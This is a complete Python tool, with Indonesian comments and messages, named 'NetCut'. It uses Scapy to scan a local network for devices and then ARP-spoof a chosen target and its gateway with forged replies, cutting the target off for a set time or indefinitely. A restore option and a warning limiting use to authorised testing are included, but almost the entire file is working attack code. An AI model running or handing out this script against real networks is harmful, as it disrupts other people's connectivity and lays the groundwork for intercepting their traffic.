#!/usr/bin/env python3
"""
ARP-based Network Disruptor (NetCut)
[ROOT REQUIRED] Melakukan ARP spoofing untuk memutuskan koneksi target dari
jaringan dengan mengirimkan ARP replies palsu ke target dan gateway.

Penggunaan:
    python netcut.py --target 192.168.1.100
    python netcut.py --target 192.168.1.100 --gateway 192.168.1.1 --time 60
    python netcut.py --target 192.168.1.100 --gateway 192.168.1.1 --time 0 --iface eth0
    python netcut.py --scan --iface eth0
    python netcut.py --target 192.168.1.100 --restore

Peringatan: Hanya untuk pengujian keamanan yang sah. Memutuskan koneksi orang lain tanpa izin adalah ilegal.
"""

import argparse
import os
import re
import signal
import socket
import struct
import subprocess
import sys
import time
from threading import Event

try:
    from scapy.all import (
        ARP, Ether, get_if_addr, get_if_hwaddr, getmacbyip,
        conf, sendp, srp, sniff
    )
except ImportError:
    sys.exit("[!] Scapy tidak terinstall. Install dengan: pip install scapy")

STOP_EVENT = Event()


def check_root():
    if os.name == "posix" and os.geteuid() != 0:
        sys.exit("[!] Tool ini memerlukan akses root. Jalankan dengan sudo.")


def signal_handler(sig, frame):
    print("\n[!] Menerima sinyal interrupt. Memulihkan tabel ARP dan menghentikan...")
    STOP_EVENT.set()


def get_default_gateway():
    if os.name == "posix":
        try:
            result = subprocess.run(["ip", "route", "show", "default"],
                                    capture_output=True, text=True)
            if result.stdout:
                m = re.search(r"via\s+([\d.]+)", result.stdout)
                if m:
                    return m.group(1)
        except Exception:
            pass
        try:
            result = subprocess.run(["route", "-n"], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if line.strip().startswith("0.0.0.0"):
                    parts = line.split()
                    if len(parts) >= 2:
                        return parts[1]
        except Exception:
            pass
    elif os.name == "nt":
        try:
            result = subprocess.run(
                ["powershell", "-Command",
                 "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select-Object -First 1).NextHop"],
                capture_output=True, text=True
            )
            gw = result.stdout.strip()
            if gw:
                return gw
        except Exception:
            pass
    return None


class NetCut:
    def __init__(self, iface: str):
        self.iface = iface
        self.attacker_mac = get_if_hwaddr(iface)
        try:
            self.attacker_ip = get_if_addr(iface)
        except Exception:
            self.attacker_ip = "0.0.0.0"
        self.running = True
        self.target_ip = None
        self.gateway_ip = None
        self.target_mac = None
        self.gateway_mac = None
        self.real_target_mac = None
        self.real_gateway_mac = None

    def arp_scan(self, network: str | None = None) -> dict:
        if network is None:
            ip = self.attacker_ip
            parts = ip.rsplit(".", 1)
            network = f"{parts[0]}.0/24" if len(parts) == 2 else "192.168.1.0/24"

        print(f"[*] Memindai jaringan {network}...")

        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
            timeout=3, iface=self.iface, verbose=False
        )

        devices = {}
        for _, rcv in ans:
            devices[rcv.psrc] = {"mac": rcv.hwsrc, "ip": rcv.psrc}

        if devices:
            print(f"\n[+] {len(devices)} perangkat ditemukan:")
            print(f"    {'IP Address':<16} {'MAC Address':<19} {'Gateway':^10}")
            print(f"    {'-'*16} {'-'*19} {'-'*10}")
            for ip, info in sorted(devices.items(), key=lambda x: socket.inet_aton(x[0])):
                gw_marker = " * " if ip == self.gateway_ip else ""
                print(f"    {ip:<16} {info['mac']:<19} {gw_marker:^10}")
        else:
            print("[!] Tidak ada perangkat ditemukan.")
        return devices

    def resolve_mac(self, ip: str) -> str:
        mac = getmacbyip(ip)
        if mac:
            return mac
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                         timeout=2, iface=self.iface, verbose=False)
            for _, rcv in ans:
                if rcv.psrc == ip:
                    return rcv.hwsrc
        except Exception:
            pass
        return "ff:ff:ff:ff:ff:ff"

    def start_spoof(self, target_ip: str, gateway_ip: str, duration: int):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip

        print(f"[*] Mendapatkan MAC address...")
        self.real_target_mac = self.resolve_mac(target_ip)
        self.real_gateway_mac = self.resolve_mac(gateway_ip)

        if self.real_target_mac == "ff:ff:ff:ff:ff:ff":
            print(f"[!] Tidak dapat menemukan MAC untuk target {target_ip}")
            sys.exit(1)
        if self.real_gateway_mac == "ff:ff:ff:ff:ff:ff":
            print(f"[!] Tidak dapat menemukan MAC untuk gateway {gateway_ip}")
            sys.exit(1)

        print(f"[+] Target:  {target_ip}  ({self.real_target_mac})")
        print(f"[+] Gateway: {gateway_ip} ({self.real_gateway_mac})")
        print(f"[+] Attacker MAC: {self.attacker_mac}")

        print(f"\n[*] Memulai ARP spoof... (Ctrl+C untuk berhenti dan memulihkan)")
        if duration > 0:
            print(f"[*] Durasi: {duration} detik")
        else:
            print("[*] Durasi: tak terbatas")
        time.sleep(0.5)

        start_time = time.time()
        packet_count = 0

        try:
            while not STOP_EVENT.is_set():
                if duration > 0 and (time.time() - start_time) >= duration:
                    break

                target_pkt = Ether(src=self.attacker_mac, dst=self.real_target_mac) / ARP(
                    op=2, psrc=self.gateway_ip, pdst=self.target_ip,
                    hwsrc=self.attacker_mac, hwdst=self.real_target_mac
                )

                gateway_pkt = Ether(src=self.attacker_mac, dst=self.real_gateway_mac) / ARP(
                    op=2, psrc=self.target_ip, pdst=self.gateway_ip,
                    hwsrc=self.attacker_mac, hwdst=self.real_gateway_mac
                )

                sendp(target_pkt, iface=self.iface, verbose=False)
                sendp(gateway_pkt, iface=self.iface, verbose=False)
                packet_count += 2
                print(f"  [*] Paket ARP spoof dikirim: {packet_count}", end="\r")
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        except PermissionError:
            sys.exit("[!] Izin ditolak. Jalankan sebagai root.")

        print(f"\n[+] Selesai. Total {packet_count} paket ARP dikirim.")
        self.restore_arp()

    def restore_arp(self):
        if not self.target_ip or not self.gateway_ip:
            return
        print("[*] Memulihkan tabel ARP...")
        if not self.real_target_mac or not self.real_gateway_mac:
            print("[!] MAC asli tidak diketahui. Melewatkan pemulihan.")
            return

        for _ in range(5):
            restore_target = Ether(src=self.real_gateway_mac, dst=self.real_target_mac) / ARP(
                op=2, psrc=self.gateway_ip, pdst=self.target_ip,
                hwsrc=self.real_gateway_mac, hwdst="ff:ff:ff:ff:ff:ff"
            )
            restore_gateway = Ether(src=self.real_target_mac, dst=self.real_gateway_mac) / ARP(
                op=2, psrc=self.target_ip, pdst=self.gateway_ip,
                hwsrc=self.real_target_mac, hwdst="ff:ff:ff:ff:ff:ff"
            )
            sendp(restore_target, iface=self.iface, verbose=False)
            sendp(restore_gateway, iface=self.iface, verbose=False)
            time.sleep(0.3)

        print("[+] Tabel ARP dipulihkan.")


def main():
    parser = argparse.ArgumentParser(
        description="ARP-based Network Disruptor (NetCut) [ROOT REQUIRED]",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Contoh:
  python netcut.py --target 192.168.1.100
  python netcut.py --target 192.168.1.100 --gateway 192.168.1.1 --time 60 --iface eth0
  python netcut.py --scan --iface eth0
  python netcut.py --target 192.168.1.100 --restore
        """,
    )
    parser.add_argument("--target", help="IP target yang akan diputuskan")
    parser.add_argument("--gateway", help="IP gateway (auto-detect jika tidak diatur)")
    parser.add_argument("--iface", help="Interface jaringan (contoh: eth0, wlan0, enp0s3)")
    parser.add_argument("--time", type=int, default=0, help="Durasi serangan dalam detik (0 = tak terbatas)")
    parser.add_argument("--scan", action="store_true", help="Scan jaringan untuk menemukan perangkat")
    parser.add_argument("--restore", action="store_true", help="Pulihkan tabel ARP target")
    args = parser.parse_args()

    print("=" * 55)
    print("  ARP-based Network Disruptor (NetCut)")
    print("  [ROOT REQUIRED]")
    print("=" * 55)

    check_root()
    signal.signal(signal.SIGINT, signal_handler)

    if not args.iface:
        args.iface = conf.iface
        if not args.iface:
            sys.exit("[!] Tidak dapat mendeteksi interface. Gunakan --iface.")
        print(f"[*] Interface auto-detect: {args.iface}")

    netcut = NetCut(args.iface)

    gateway = args.gateway or get_default_gateway()
    netcut.gateway_ip = gateway

    if not gateway:
        print("[!] Tidak dapat mendeteksi gateway. Gunakan --gateway secara manual.")
    else:
        print(f"[+] Gateway: {gateway}")

    if args.scan:
        netcut.arp_scan()
        return

    if args.restore:
        if not args.target:
            sys.exit("[!] --target diperlukan untuk --restore")
        if not gateway:
            sys.exit("[!] --gateway diperlukan untuk --restore (tidak dapat auto-detect)")
        netcut.target_ip = args.target
        netcut.gateway_ip = gateway
        netcut.real_target_mac = netcut.resolve_mac(args.target)
        netcut.real_gateway_mac = netcut.resolve_mac(gateway)
        netcut.restore_arp()
        return

    if not args.target:
        sys.exit("[!] --target diperlukan. Gunakan juga --scan untuk menemukan perangkat.")
    if not gateway:
        sys.exit("[!] --gateway diperlukan. Gunakan --scan dulu atau set --gateway manual.")

    print("[!] Peringatan: Hanya untuk pengujian keamanan yang sah dan terotorisasi!")
    print("[!] Memutuskan koneksi orang lain tanpa izin adalah ilegal.\n")
    time.sleep(1)

    netcut.start_spoof(args.target, gateway, args.time)


if __name__ == "__main__":
    main()
